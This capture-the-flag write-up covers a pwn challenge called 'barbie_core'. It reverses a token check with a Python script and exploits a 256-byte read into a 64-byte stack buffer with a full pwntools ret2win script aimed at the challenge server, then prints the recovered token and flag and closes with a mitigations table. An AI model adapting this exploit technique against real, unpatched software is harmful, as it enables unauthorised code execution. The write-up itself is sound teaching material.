---
title: "BiTerraCTF — Barbieland Buffer Blowout (Pwn)"
date: 2026-06-20 00:00:00 +0800
categories: [CTF, Pwn]
tags: [biterra, ret2win, stack-overflow, reverse-engineering, rop]
---

**Category:** Pwn  
**Binary:** `barbie_core`  
**Vulnerability:** Stack buffer overflow in `vulnerable_prompt` — `read()` reads 256 bytes into a 64-byte stack buffer, enabling ret2win after reversing a token gate.

## Summary

Two-stage challenge. First, crack a per-byte keyed transform to produce the correct 16-byte token and pass the `check_token` gate. Second, exploit `read(0, buf, 0x100)` writing into a 64-byte buffer to overflow the stack, overwrite the return address, and redirect execution to the never-called `win()` function that prints the flag.

## Vulnerability / Bug

### Recon

```bash
file barbie_core
# ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

checksec --file=barbie_core
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE
```

| Protection | Status | Impact |
|---|---|---|
| Stack Canary | **Absent** | Overflow undetected; direct RIP overwrite |
| NX | Enabled | No shellcode — ret2win instead |
| PIE | **Absent** | `win()` is always at `0x4013c3` |
| RELRO | Partial | Irrelevant here |

No canary + no PIE = one-shot ret2win, no leak stage needed.

### `main()` — Token gate

```c
undefined8 main(void)
{
    char local_48[64];
    // ...
    fgets(local_48, 0x40, stdin);           // safe — 63 bytes max
    if (check_token(local_48) == 0) {
        puts("Glam sync failed. Session terminated.");
        return 1;
    }
    vulnerable_prompt();                    // only reached with valid token
    return 0;
}
```

### `vulnerable_prompt()` — The bug

```c
void vulnerable_prompt(void)
{
    undefined1 local_48[64];               // 64-byte stack buffer

    puts("Calibration accepted.");
    puts("Upload pilot profile packet:");
    write(1, "pilot> ", 7);

    read(0, local_48, 0x100);             // BUG: reads 256 bytes into 64-byte buffer
    puts("Packet stored.");
    return;
}
```

Confirmed in disassembly:

```asm
401525: sub    rsp, 0x40       ; allocate 64 bytes
401560: lea    rax, [rbp-0x40] ; dst = local_48
401564: mov    edx, 0x100      ; size = 256  ← wrong
401571: call   read
401586: leave
401587: ret                    ; loads attacker-controlled RIP
```

The programmer wrote `0x100` instead of `0x40`, giving 192 bytes of overflow headroom.

### `win()` — Target

```c
void win(void)
{
    char local_98[128];
    char *local_10 = getenv("FLAG_PATH");
    if (local_10 == NULL || *local_10 == '\0') local_10 = "/flag.txt";

    FILE *f = fopen(local_10, "r");
    fgets(local_98, 0x80, f);
    printf("Ancient message recovered: %s\n", local_98);
    fclose(f);
}
```

Never called in normal flow. Fixed address `0x4013c3` (no PIE).

## Exploit Strategy

### Stage 1 — Cracking `check_token`

`check_token` runs a 16-round keyed transform against a `target_0` array embedded in `.rodata` at `0x402150`:

```
target_0 = [0x5a,0x06,0xb5,0x86,0x17,0x08,0x8e,0xba,
            0xd6,0xd4,0xd7,0x06,0xb7,0x96,0x38,0xae]
```

Forward transform per round `i`:

```
r      = rol8(state, i % 5)
check  = (r + (offset ^ inp)) % 256        # check must equal target[i]
state  = (target[i] ^ state * 0x21) % 256  # advance state
```

where `offset = i*7 + 90` (C signed arithmetic).

Since `check` and `target[i]` are known, inverting for `inp` is trivial:

```
inp = offset ^ ((target[i] - r) & 0xff)
```

Python script to recover the token:

```python
def rol8(val, n):
    val, n = val & 0xff, n & 7
    return ((val << n) | (val >> (8 - n))) & 0xff

target = [0x5a,0x06,0xb5,0x86,0x17,0x08,0x8e,0xba,
          0xd6,0xd4,0xd7,0x06,0xb7,0x96,0x38,0xae]

state = 0x42   # 'B'
token = []

for i in range(16):
    r = rol8(state, i % 5)
    r_s = r if r < 128 else r - 256          # signed char
    o = (i * 8) & 0xff
    if o >= 128: o -= 256
    offset = o - i + 0x5a
    inp = (offset ^ ((target[i] - r_s) & 0xff)) & 0xff
    token.append(inp)
    state = (target[i] ^ (state * 0x21)) & 0xff

print(bytes(token).decode())   # → B4RB13-C0R3GL4M!
```

**Token:** `B4RB13-C0R3GL4M!`

### Stage 2 — Stack overflow to ret2win

Stack layout of `vulnerable_prompt` (grows downward):

```
┌──────────────────────┐
│  return address (8B) │  ← rbp + 8  ← overwrite with win()
├──────────────────────┤
│  saved RBP      (8B) │  ← rbp
├──────────────────────┤
│  local_48      (64B) │  ← rbp - 0x40
└──────────────────────┘
```

Offset to return address: **64 (buffer) + 8 (saved RBP) = 72 bytes**.

`win()` calls `fopen()` which uses SSE instructions requiring 16-byte stack alignment. Overwriting the return address shifts RSP by 8, breaking alignment. Prefixing the payload with a single `ret` gadget restores alignment:

```bash
ROPgadget --binary barbie_core --rop | grep ": ret$"
# → 0x000000000040101a : ret
```

Final payload:

```
[ 'A' * 72 ] [ 0x40101a ] [ 0x4013c3 ]
  padding      ret gadget   win()
```

### Full exploit

```python
from pwn import *

TOKEN   = b'B4RB13-C0R3GL4M!'
WIN     = 0x4013c3
RET_GAD = 0x40101a
OFFSET  = 72

p = remote('165.227.65.101', 5000)

p.recvuntil(b'code> ')
p.sendline(TOKEN)

p.recvuntil(b'pilot> ')
payload = b'A' * OFFSET + p64(RET_GAD) + p64(WIN)
p.sendline(payload)

print(p.recvall(timeout=5).decode())
p.close()
```

```
Packet stored.
Ancient message recovered: bitctf{b4rb13_buff3r_b10w0u7}
```

## Fix / Mitigations

| Mitigation | Effect |
|---|---|
| Fix `read()` size to `sizeof(local_48)` (64) | Eliminates the overflow entirely |
| Enable stack canary (`-fstack-protector-all`) | Detects overflow before `ret` |
| Enable PIE | Randomises `win()` address; requires a leak to exploit |
| Enable Full RELRO | Defense-in-depth; does not affect this specific bug |
